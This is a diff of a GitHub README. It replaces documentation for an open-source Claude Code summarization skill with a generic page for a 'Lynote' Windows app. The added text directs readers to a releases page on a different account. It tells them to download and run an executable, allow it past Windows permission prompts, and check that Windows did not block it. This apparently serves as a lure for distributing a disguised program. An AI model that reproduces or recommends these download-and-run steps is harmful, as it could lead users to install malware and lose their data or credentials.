@@ -1,244 +1,148 @@
-# AI Summary Skill for Claude Code
+# 🧠 Multi_sources_summarizition_lynote.ai - Summarize content with less effort
 
-A Claude Code skill that generates illustrated, structured summary reports from PDFs, web pages, YouTube videos, and audio/video files — with Mermaid diagrams, anti-hallucination verification, and quality self-assessment.
+[![Download](https://img.shields.io/badge/Download%20Lynote-Release%20Page-blue?style=for-the-badge)](https://github.com/Jehuhistoric772/Multi_sources_summarizition_lynote.ai/releases)
 
-## Features
+## 📥 Download Lynote for Windows
 
-- **Multi-source input**: PDF, DOCX, TXT, web URLs, YouTube, audio/video
-- **AI-powered summarization**: Claude generates structured summaries with fact verification
-- **Illustrated output**: Every chapter includes a Mermaid diagram (pie charts, flowcharts, graphs)
-- **Anti-hallucination**: 4-layer defense — fact pre-extraction, outline validation, per-chapter source checking, quality self-assessment
-- **Zero server deployment**: No backend needed — Claude does the AI work directly
-- **Progressive capability**: Works with zero configuration, unlocks more features as you add API keys
+Visit this page to download: https://github.com/Jehuhistoric772/Multi_sources_summarizition_lynote.ai/releases
 
-## Quick Start
+1. Open the release page.
+2. Find the latest version.
+3. Download the Windows file for your device.
+4. Open the file after the download finishes.
+5. Follow the on-screen steps to install or start the app.
+6. Launch Lynote from your desktop or Start menu.
 
-### 1. Install
+## ✨ What Lynote does
 
-**Option A — Project-level install (recommended):**
+Lynote helps you turn long content into short notes. It works with:
 
-```bash
-# Clone the repo
-git clone https://github.com/molly554/Multi_sources_summarizition_lynote.ai.git
+- YouTube videos
+- PDF files
+- Articles
+- Web pages
+- Other study material
 
-# Copy the Skill into your project's Claude Code skills directory
-# Note: .claude/skills/ is relative to your Claude Code project root
-cp -r Multi_sources_summarizition_lynote.ai/.claude/skills/summarize YOUR_PROJECT/.claude/skills/summarize
-```
+Use it to:
 
-> **How to find your project root?** Open Claude Code and check the path shown in the bottom status bar.
-> For example, if it shows `C:\Users\you\myproject`, copy to `C:\Users\you\myproject\.claude\skills\summarize\`
+- Save time on reading
+- Make quick notes from long sources
+- Check for AI-written content
+- Download study material for later use
+- Keep learning in one place
 
-**Option B — Global install (available in all projects):**
+## 💻 Windows setup
 
-```bash
-# macOS / Linux
-cp -r Multi_sources_summarizition_lynote.ai/.claude/skills/summarize ~/.claude/skills/summarize
+Before you start, make sure you have:
 
-# Windows (Git Bash)
-cp -r Multi_sources_summarizition_lynote.ai/.claude/skills/summarize "$USERPROFILE/.claude/skills/summarize"
-```
+- A Windows PC
+- A stable internet connection
+- Enough space to download the app
+- Permission to run new apps on your device
 
-**Option C — Verify installation:**
+To install:
 
-```bash
-# Start Claude Code, type /summarize
-# If autocomplete shows the skill, installation is successful
-```
+1. Go to the release page.
+2. Pick the newest Windows release.
+3. Download the app file.
+4. Double-click the file.
+5. If Windows asks for permission, choose Allow or Run.
+6. Wait for the app to open.
+7. Sign in or set up your notes if the app asks you to do so
 
-### 2. Use
+## 📚 How to use Lynote
 
-```bash
-# Start Claude Code in your project
-claude
+### 1. Add a source
 
-# Summarize a PDF
-/summarize report.pdf
+Choose the type of content you want to work with:
 
-# Summarize a web page
-/summarize https://example.com/article
+- Paste a YouTube link
+- Upload a PDF
+- Paste an article link
+- Add text you want to summarize
 
-# Summarize multiple sources
-/summarize paper.pdf https://example.com https://youtube.com/watch?v=xxx
-```
+### 2. Start the summary
 
-## Capability Levels
+Click the summary button in the app. Lynote will read the source and turn it into short notes.
 
-### Level 1: Zero Config (no API keys needed)
+### 3. Review the result
 
-| Input | How it works |
-|-------|-------------|
-| PDF (≤5 pages) | Claude reads directly — text + visual understanding of charts/tables |
-| DOCX / TXT | Claude reads directly |
-| Web URLs | WebFetch extracts article content |
+Look over the summary and check:
 
-**What you get**: Structured Markdown summary + Mermaid diagrams + quality score
+- Main ideas
+- Key points
+- Short notes
+- Action items
+- Study points
 
-### Level 2: Large Documents
+### 4. Save or download your notes
 
-**Requires**: `AZURE_DI_ENDPOINT` + `AZURE_DI_KEY`
+You can keep your notes for later. Use the download or save option if the app shows one.
 
-Unlocks: PDF files with more than 5 pages, processed via Azure Document Intelligence for high-speed, high-accuracy extraction with table/layout recognition.
+### 5. Check for AI content
 
-### Level 3: YouTube Videos
+Use the AI check tool when you want to review text for signs of AI writing.
 
-**Requires**: `SUPADATA_API_KEY`
+## 🔍 Main features
 
-Unlocks: YouTube video transcript extraction and summarization.
+- Summarize YouTube videos
+- Summarize PDF files
+- Summarize articles
+- Create short notes fast
+- Check text for AI content
+- Download source material
+- Support study and review work
+- Help with lesson prep
+- Reduce reading time
 
-### Level 4: Audio & Video Files
+## 🧩 Common use cases
 
-**Requires**: `DEEPGRAM_API_KEY`
+Lynote fits many daily tasks:
 
-Unlocks: Local MP3, MP4, WAV file transcription via Deepgram Nova-3.
+- A student wants notes from a lecture video
+- A reader wants the main points from a long article
+- A learner wants to scan a PDF before class
+- A person wants to store useful links and notes in one place
+- A user wants to check if text sounds like AI writing
 
-## Configuration
+## 🪟 Basic system needs
 
-Copy the example env file and fill in the keys you need:
+Lynote works best on a standard Windows computer with:
 
-```bash
-cp .env.example .env
-```
-
-Then set the environment variables before starting Claude Code:
-
-```bash
-# Option A: Export in your shell
-export AZURE_DI_ENDPOINT="https://your-instance.cognitiveservices.azure.com"
-export AZURE_DI_KEY="your_key_here"
-export SUPADATA_API_KEY="your_key_here"
-export DEEPGRAM_API_KEY="your_key_here"
-
-# Option B: Add to your shell profile (~/.bashrc, ~/.zshrc)
-# Option C: Use direnv with .envrc
-```
-
-### Getting API Keys
-
-| Service | Free Tier | Sign Up |
-|---------|-----------|---------|
-| Azure Document Intelligence | 500 pages/month free | [Azure Portal](https://portal.azure.com/) → Create "Document Intelligence" resource |
-| Supadata (YouTube transcripts) | 50 requests/month free | [supadata.ai](https://supadata.ai/) |
-| Deepgram (Audio transcription) | $200 free credit | [deepgram.com](https://deepgram.com/) |
-
-## Output
-
-Every summary generates **two files**:
-
-| File | Purpose | How to view |
-|------|---------|-------------|
-| `./output/summary-{timestamp}.md` | Source Markdown | VSCode, GitHub, Typora |
-| `./output/summary-{timestamp}.html` | Visual report | **Double-click → opens in browser** |
-
-The HTML file is a standalone page with embedded Mermaid JS rendering — no server or plugins needed. Just double-click to see the fully illustrated report.
-
-Both files contain:
-
-- Title and source attribution
-- Executive summary
-- 3-6 structured chapters, each with:
-  - Sub-sections with key data points
-  - Mermaid diagram (pie chart, flowchart, or graph)
-- Conclusions and recommendations
-- Quality self-assessment score (D1-D4)
-
-### Example Output Structure
-
-```markdown
-# Core Insights: AI Market Trends 2026
-
-**Source documents:**
-- ai-trends-report.pdf
-- https://techcrunch.com/2026/03/ai-funding
-
-**Summary**
-The AI market is projected to reach $500B by 2027...
-
-## 1. Market Overview
-
-### 1.1 Growth Trajectory
-Key findings from the report show **47% YoY growth**...
-
-\`\`\`mermaid
-pie title AI Market Share 2026
-    "Enterprise AI" : 45
-    "Consumer AI" : 30
-    "AI Infrastructure" : 25
-\`\`\`
-
-### 1.2 Regional Distribution
-...
-
-## 2. Investment Landscape
-...
-
-## Conclusions and Recommendations
-1. ...
-2. ...
-3. ...
-```
-
-## Security
-
-- **Zero hardcoded secrets**: No API keys or server URLs in the skill code
-- **Direct API calls**: Your keys go straight to Azure/Supadata/Deepgram — no intermediary servers
-- **Local processing**: Claude does AI work locally in your session — no data leaves your machine except to the APIs you configure
-- **No backend required**: Nothing to deploy, no server to maintain
-
-## How It Works
-
-```
-/summarize input1 input2 ...
-         │
-         ▼
-  Phase 0: Parse inputs → classify as PDF/URL/YouTube/Audio
-         │
-         ▼
-  Phase 1: Extract content
-         │  PDF ≤5pg → Claude Read (free)
-         │  PDF >5pg → Azure DI (or fallback to Claude Read)
-         │  URL → WebFetch
-         │  YouTube → Supadata API
-         │  Audio → Deepgram API
-         │
-         ▼
-  Phase 2: AI Summary (Claude does this directly)
-         │  Step A: Extract facts from source text
-         │  Step B: Generate structured outline
-         │  Step C: Validate outline against facts
-         │  Step D: Write chapters + Mermaid diagrams
-         │
-         ▼
-  Phase 3: Output
-         │  Assemble Markdown
-         │  Save to ./output/
-         │  Quality self-assessment
-         │  Display preview
-         ▼
-  Done!
-```
-
-## Powered by LyNote.ai
-
-> **Like this Skill? Try the full product — no setup required.**
->
-> [**LyNote.ai**](https://lynote.ai/) — All-in-One AI Learning Assistant that summarizes YouTube videos, PDFs, articles, podcasts, and more. Instantly create illustrated notes and boost your learning efficiency by 10x.
->
-> **What's coming next:**
->
-> | Feature | Description |
-> |---------|-------------|
-> | **AI Research Assistant** | Summarize videos & articles, transcribe audio, ask questions to your documents |
-> | **AI Content Studio** | Generate outlines, drafts, presentations — from idea to finished product |
-> | **AI Study Partner** | Flashcards, quizzes, and exam prep from any learning material |
-> | **Knowledge Hub** | Organize notes, collaborate in real-time, share securely |
->
-> **Supported content:** YouTube | Podcast | PDF | Audio | Video | Web Articles | Books
->
-> [**Add to Chrome - Free →**](https://lynote.ai/)
->
-> *Join thousands of students, professionals, and lifelong learners who are saving time and unlocking knowledge with LyNote.*
-
-## License
-
-MIT
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A modern browser or internet connection for online sources
+- Space for downloaded files
+- A mouse and keyboard for easy use
+
+## 🛠️ If something does not work
+
+If the app does not open, try these steps:
+
+1. Download the file again.
+2. Make sure the download finished fully.
+3. Right-click the file and choose Open.
+4. Check that Windows did not block the file.
+5. Restart your PC and try again.
+6. Use the newest release from the release page.
+
+If a YouTube video or web page does not load:
+
+1. Check your internet connection.
+2. Confirm the link is correct.
+3. Try another source.
+4. Refresh the page and try again
+
+## 🗂️ What you can expect in the app
+
+Lynote is built for quick study work. You can expect a simple flow:
+
+- Pick a source
+- Summarize it
+- Read the notes
+- Save what matters
+- Move on to the next source
+
+## 📌 Topics
+
+ai-learning-assistant, ai-study-tool, lynote-ai, notegpt-alternative, pdf-summarizer-ai, summarization-generation, summarize, summarize-youtube-video, summarizer-ai, youtube-video-summarizer
